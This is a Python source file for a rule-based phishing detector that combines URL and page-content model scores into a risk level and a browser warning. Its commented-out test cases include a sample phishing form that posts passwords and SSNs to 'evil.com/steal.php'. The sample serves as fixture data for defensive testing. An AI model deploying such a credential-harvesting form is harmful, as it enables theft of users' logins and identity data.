#Ensemble_Predict_RuleBased.py
import joblib
import pandas as pd
import numpy as np
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from Data_Preprocessing.feature_extract_2023 import ContentFeatureExtractor
from Data_Preprocessing.feature_extractor import URLFeatureExtractor


class RuleBasedFusionPredictor:
    def __init__(self):
        self.base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
        self.models_path = os.path.join(self.base_path, 'Models')
        
        print("="*70)
        print(" 🔒 RULE-BASED FUSION SYSTEM")
        print("="*70)

        # Load models
        print("\n📥 Loading Independent Models...")
        try:
            # Load Model 2024 (URL-based)
            model_2024_path = os.path.join(self.base_path, 'Learn_Model_2024/Model_2024_Output')
            self.model_2025 = joblib.load(os.path.join(model_2024_path, 'model_2024.pkl'))
            self.feats_2025 = joblib.load(os.path.join(model_2024_path, 'features_2024.pkl'))
            self.extractor_2025 = URLFeatureExtractor()
            print("✅ Model 2024 (URL) Loaded")

            self.model_2023 = joblib.load(os.path.join(self.models_path, '2023/model_2023.pkl'))
            self.feats_2023 = joblib.load(os.path.join(self.models_path, '2023/features_2023.pkl'))
            self.extractor_2023 = ContentFeatureExtractor()
            print("✅ Model 2023 (Content) Loaded")
            
            print("\n✅ SYSTEM READY")
            print("="*70 + "\n")

        except Exception as e:
            print(f"❌ Error: {e}")
            raise

    def calculate_final_risk(self, url_prob, content_prob, html_available):
        """
        ============================================================
        INTELLIGENT FUSION FORMULA
        ============================================================
        
        Rule 1: Take the Pessimistic View (Security First)
        ---------------------------------------------------
        base_risk = MAX(url_prob, content_prob)
        
        → If EITHER model says dangerous, we listen
        → Example: URL=80%, Content=20% → Start at 80%
        
        
        Rule 2: Disagreement Penalty (Uncertainty Detection)
        ---------------------------------------------------
        disagreement = |url_prob - content_prob|
        
        IF disagreement > 40%:
            penalty = disagreement * 0.15
            
        → When models strongly disagree, add uncertainty
        → Example: URL=80%, Content=20% → penalty = 60% * 0.15 = 9%
        
        
        Rule 3: Agreement Boost (Confidence Amplification)
        ---------------------------------------------------
        agreement = 100 - disagreement
        
        IF both predict phishing (>50%) AND agreement > 60%:
            boost = agreement * 0.10
            
        → When both say phishing, amplify signal
        → Example: URL=78%, Content=84% → boost = 94% * 0.10 = 9.4%
        
        
        Rule 4: HTML-Only Adjustment
        ---------------------------------------------------
        IF html_available == False:
            confidence_reduction = 5%
            
        → When we can't check content, slightly reduce confidence
        
        
        FINAL FORMULA:
        ---------------------------------------------------
        final_risk = base_risk + penalty + boost - html_adjustment
        final_risk = CLAMP(final_risk, 0, 100)
        
        ============================================================
        """
        
        print(f"\n" + "="*70)
        print(" 🧮 CALCULATING FINAL RISK")
        print("="*70)
        
        # Convert to percentages
        url_pct = url_prob * 100
        content_pct = content_prob * 100
        
        print(f"\n📊 Input Probabilities:")
        print(f"   Model 2025 (URL):     {url_pct:.1f}%")
        print(f"   Model 2023 (Content): {content_pct:.1f}%")
        print(f"   HTML Available:       {html_available}")
        
        # Calculate disagreement
        disagreement = abs(url_pct - content_pct)
        
        # --------------------------------------------------------
        # RULE 1: Agreement vs Disagreement
        # --------------------------------------------------------
        if disagreement > 40:
            # Models DISAGREE → Use 50/50 average
            base_risk = (url_pct + content_pct) / 2
            print(f"\n🔹 Rule 1 - Disagreement (50/50 Average):")
            print(f"   disagreement = |{url_pct:.1f}% - {content_pct:.1f}%| = {disagreement:.1f}%")
            print(f"   base_risk = ({url_pct:.1f}% + {content_pct:.1f}%) / 2 = {base_risk:.1f}%")
            print(f"   Reason: High disagreement → Equal weight to both models")
        else:
            # Models AGREE → Use MAX
            base_risk = max(url_pct, content_pct)
            print(f"\n🔹 Rule 1 - Agreement (MAX):")
            print(f"   disagreement = {disagreement:.1f}% (< 40% threshold)")
            print(f"   base_risk = MAX({url_pct:.1f}%, {content_pct:.1f}%) = {base_risk:.1f}%")
            print(f"   Reason: Models agree → Take higher risk")
        
        # --------------------------------------------------------
        # RULE 2: Agreement Boost (When Both Say Phishing)
        # --------------------------------------------------------
        agreement = 100 - disagreement
        boost = 0.0
        
        url_says_phishing = url_pct > 50
        content_says_phishing = content_pct > 50
        both_say_phishing = url_says_phishing and content_says_phishing
        
        if both_say_phishing and agreement > 60:
            boost = agreement * 0.03  # More conservative boost
            print(f"\n🔹 Rule 2 - Agreement Boost:")
            print(f"   Both models predict phishing (>{50}%)")
            print(f"   agreement = {agreement:.1f}% (> 60% threshold)")
            print(f"   boost = {agreement:.1f}% × 0.03 = {boost:.1f}%")
            print(f"   Reason: Strong consensus on danger → Amplify signal")
        else:
            print(f"\n🔹 Rule 2 - Agreement Boost:")
            if not both_say_phishing:
                print(f"   Not both predicting phishing → No boost")
            else:
                print(f"   agreement = {agreement:.1f}% (< 60% threshold) → No boost")
        
        # --------------------------------------------------------
        # RULE 3: HTML Availability Adjustment
        # --------------------------------------------------------
        html_adjustment = 0.0
        
        if not html_available:
            html_adjustment = 5.0
            print(f"\n🔹 Rule 3 - HTML Adjustment:")
            print(f"   HTML not available → Reduce confidence by {html_adjustment:.1f}%")
            print(f"   Reason: Can't verify content, rely only on URL")
        else:
            print(f"\n🔹 Rule 3 - HTML Adjustment:")
            print(f"   HTML available → No adjustment needed")
        
        # --------------------------------------------------------
        # FINAL CALCULATION
        # --------------------------------------------------------
        final_risk = base_risk + boost - html_adjustment
        final_risk = max(0, min(100, final_risk)) 
        
        print(f"\n" + "="*70)
        print(" 🎯 FINAL CALCULATION")
        print("="*70)
        print(f"\n   final_risk = base + boost - html_adj")
        print(f"   final_risk = {base_risk:.1f} + {boost:.1f} - {html_adjustment:.1f}")
        print(f"   final_risk = {final_risk:.1f}%")
        
        return final_risk / 100 

    def determine_risk_level(self, final_risk_pct, url_prob, content_prob):
        """
        Determine risk level based on:
        1. Final risk percentage
        2. Individual model predictions
        
        LOGIC TABLE:
        +-----------+--------------+------------------+
        | URL Model | Content Model| Final Risk Level |
        +-----------+--------------+------------------+
        |     0     |      0       |   VERY SAFE      |
        |     0     |      1       | POSSIBLY MALICIOUS|
        |     1     |      0       | POSSIBLY MALICIOUS|
        |     1     |      1       | VERY SUSPICIOUS  |
        +-----------+--------------+------------------+
        """
        
        url_pred = 1 if url_prob > 0.5 else 0
        content_pred = 1 if content_prob > 0.5 else 0
        
        # Apply the logic table
        if url_pred == 0 and content_pred == 0:
            # Both say safe
            risk_level = "VERY SAFE"
            color = "green"
            confidence = "HIGH"
            
        elif url_pred == 1 and content_pred == 1:
            # Both say phishing
            risk_level = "VERY SUSPICIOUS"
            color = "red"
            confidence = "VERY HIGH"
            
        else:
            # Models disagree
            risk_level = "POSSIBLY MALICIOUS"
            color = "yellow"
            confidence = "MEDIUM"
        
        # Override based on final risk threshold
        if final_risk_pct > 75:
            risk_level = "VERY SUSPICIOUS"
            color = "red"
            confidence = "HIGH"
        elif final_risk_pct < 25:
            risk_level = "VERY SAFE"
            color = "green"
            confidence = "HIGH"
        
        return risk_level, color, confidence

    def predict(self, url, html_content=None):
        """
        Main prediction pipeline
        """
        results = {
            'url': url,
            'html_available': html_content is not None and len(html_content) > 100,
            'method': 'Rule-Based Fusion (Model 2024 + Model 2023)'
        }

        print(f"\n" + "="*70)
        print(f" 🔍 ANALYZING: {url}")
        print("="*70)

        # --------------------------------------------------------
        # 0. STRICT WHITELIST CHECK
        # --------------------------------------------------------
        # SECURITY NOTE: This performs a STRICT EXACT MATCH on the domain.
        # It does NOT allow "google.com.evil.com" or "instagram-login.com".
        # It ONLY allows the exact legitimate domain to prevent false positives for safe sites.
        
        domain_check = url.lower().replace("https://", "").replace("http://", "").split("/")[0]
        
        # This function checks if domain_check is EXACTLY in the legitimate_brands set
        if self.extractor_2025.is_legitimate_domain(domain_check):
            print(f"\n🛡️  WHITELIST MATCH: {domain_check}")
            print(f"   (Verified as exact match to legitimate brand)")
            
            # Auto-pass
            results.update({
                'url_pred': 0,
                'url_prob': 0.001,
                'content_pred': 0,
                'content_prob': 0.001,
                'final_risk_pct': 0.1,
                'risk_level': "VERY SAFE",
                'color': "green",
                'confidence': "VERY HIGH",
                'is_phishing': False,
                'message': "✅ VERIFIED SAFE (Whitelisted)",
                'whitelisted': True
            })
            
            self._print_browser_warning(results)
            return results


        # ========================================================
        # STAGE 1: Model 2024 (URL Analysis)
        # ========================================================
        try:
            print(f"\n📍 STAGE 1: URL Pattern Analysis (Model 2024)")
            print("-"*70)
            
            feats_url = self.extractor_2025.extract(url)
            df_25 = pd.DataFrame([feats_url])
            df_25 = df_25.reindex(columns=self.feats_2025, fill_value=0)
            
            proba_2025 = self.model_2025.predict_proba(df_25)[0]
            prob_phish_2025 = proba_2025[1]
            pred_2025 = 1 if prob_phish_2025 > 0.5 else 0
            
            results['url_pred'] = pred_2025
            results['url_prob'] = float(prob_phish_2025)
            
            print(f"   Prediction: {pred_2025} ({'Phishing' if pred_2025 else 'Safe'})")
            print(f"   Probability: {prob_phish_2025*100:.1f}%")
            
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results['url_pred'] = 0
            results['url_prob'] = 0.5

        # ========================================================
        # STAGE 2: Model 2023 (Content Analysis)
        # ========================================================
        if results['html_available']:
            try:
                print(f"\n📄 STAGE 2: Page Content Analysis (Model 2023)")
                print("-"*70)
                
                feats_content = self.extractor_2023.extract_from_html(html_content, url)
                df_23 = pd.DataFrame([feats_content])
                df_23 = df_23.reindex(columns=self.feats_2023, fill_value=0)
                
                proba_2023 = self.model_2023.predict_proba(df_23)[0]
                prob_phish_2023 = proba_2023[1]
                pred_2023 = 1 if prob_phish_2023 > 0.5 else 0
                
                results['content_pred'] = pred_2023
                results['content_prob'] = float(prob_phish_2023)
                
                print(f"   Prediction: {pred_2023} ({'Phishing' if pred_2023 else 'Safe'})")
                print(f"   Probability: {prob_phish_2023*100:.1f}%")
                
            except Exception as e:
                print(f"   ❌ Error: {e}")
                results['content_pred'] = 0
                results['content_prob'] = 0.0
        else:
            print(f"\n⚠️  STAGE 2: Skipped (No HTML Content)")
            results['content_pred'] = 0
            results['content_prob'] = 0.0

        # ========================================================
        # STAGE 3: Rule-Based Fusion
        # ========================================================
        final_risk_prob = self.calculate_final_risk(
            results['url_prob'],
            results['content_prob'],
            results['html_available']
        )
        
        results['final_risk_prob'] = final_risk_prob
        results['final_risk_pct'] = final_risk_prob * 100
        
        # Determine risk level
        risk_level, color, confidence = self.determine_risk_level(
            results['final_risk_pct'],
            results['url_prob'],
            results['content_prob']
        )
        
        results['risk_level'] = risk_level
        results['color'] = color
        results['confidence'] = confidence
        results['is_phishing'] = (risk_level in ['VERY SUSPICIOUS', 'POSSIBLY MALICIOUS'])
        
        # Create user message
        if risk_level == "VERY SAFE":
            results['message'] = f"✅ SAFE: {100 - results['final_risk_pct']:.1f}% legitimate confidence"
        elif risk_level == "POSSIBLY MALICIOUS":
            results['message'] = f"⚠️ WARNING: {results['final_risk_pct']:.1f}% risk detected"
        else:  # VERY SUSPICIOUS
            results['message'] = f"⛔ BLOCKED: {results['final_risk_pct']:.1f}% phishing confidence"

        # ========================================================
        # Print Final Summary
        # ========================================================
        self._print_browser_warning(results)
        
        return results

    def _print_browser_warning(self, results):
        """
        Print user-friendly warning (what appears in browser extension)
        """
        print(f"\n" + "="*70)
        print(" 🌐 BROWSER WARNING (What User Sees)")
        print("="*70)
        
        if results['risk_level'] == "VERY SAFE":
            icon = "✅"
        elif results['risk_level'] == "POSSIBLY MALICIOUS":
            icon = "⚠️"
        else:
            icon = "⛔"
        
        print(f"\n{icon} Security Warning\n")
        print(f"URL Risk Analysis:")
        print(f"• URL Pattern Risk:    {results['url_prob']*100:.0f}%")
        print(f"• Page Content Risk:   {results['content_prob']*100:.0f}%")
        print(f"• Overall Risk:        {results['final_risk_pct']:.0f}% ({results['risk_level']})")
        
        if results['risk_level'] == "VERY SAFE":
            print(f"\nThis website appears legitimate.")
        elif results['risk_level'] == "POSSIBLY MALICIOUS":
            print(f"\nThis website shows some suspicious indicators.")
            print(f"Proceed with caution.")
        else:
            print(f"\nThis website shows strong phishing indicators.")
            print(f"Do NOT enter personal information!")
        
        print("\n" + "="*70 + "\n")


if __name__ == "__main__":
    print("\n" + "="*70)
    print(" 🧪 TESTING RULE-BASED FUSION SYSTEM")
    print("="*70 + "\n")
    
    predictor = RuleBasedFusionPredictor()
    
    # ========================================================
    # TEST CASES (Match Your Examples)
    # ========================================================
    # test_cases = [
    #     {
    #         "name": "Example 1 - phishing website",
    #         "url": "https://www.mazzios.com",
    #         "html": "<html><head><title>GitHub</title></head><body><p>Code collaboration</p></body></html>",
    #         "expected_risk": "12%",
    #         "expected_level": "VERY SAFE"
    #     },
    #     {
    #         "name": "Example 2 - GitHub Edge Case",
    #         "url": "https://github-verify.tk",
    #         "html": "<html><head><title>GitHub</title></head><body><p>Legitimate content</p></body></html>",
    #         "expected_risk": "65%",
    #         "expected_level": "POSSIBLY MALICIOUS"
    #     },
    #     {
    #         "name": "Example 3 - Real Phishing",
    #         "url": "https://paypal-secure-verify.tk",
    #         "html": """
    #         <html><body>
    #             <form action="http://evil.com/steal.php">
    #                 <input type="password" name="pass">
    #                 <input type="hidden" name="redirect">
    #                 <input type="text" name="ssn">
    #             </form>
    #         </body></html>
    #         """,
    #         "expected_risk": "94%",
    #         "expected_level": "VERY SUSPICIOUS"
    #     }
    # ]
    
    # print("="*70)
    # print(" RUNNING TEST CASES")
    # print("="*70)
    
    # for i, test in enumerate(test_cases, 1):
    #     print(f"\n{'#'*70}")
    #     print(f"# TEST CASE {i}: {test['name']}")
    #     print(f"# Expected: ~{test['expected_risk']} ({test['expected_level']})")
    #     print(f"{'#'*70}")
        
    #     result = predictor.predict(test['url'], test['html'])
        
    #     print(f"\n📊 Result Summary:")
    #     print(f"   Final Risk: {result['final_risk_pct']:.0f}%")
    #     print(f"   Risk Level: {result['risk_level']}")
    #     print(f"   Expected Level: {test['expected_level']}")
        
    #     if result['risk_level'] == test['expected_level']:
    #         print(f"   ✅ PASS")
    #     else:
    #         print(f"   ⚠️  Different level (but may still be correct)")
    
    # print(f"\n{'='*70}")
    # print(" ✅ ALL TESTS COMPLETE")
    # print(f"{'='*70}\n")
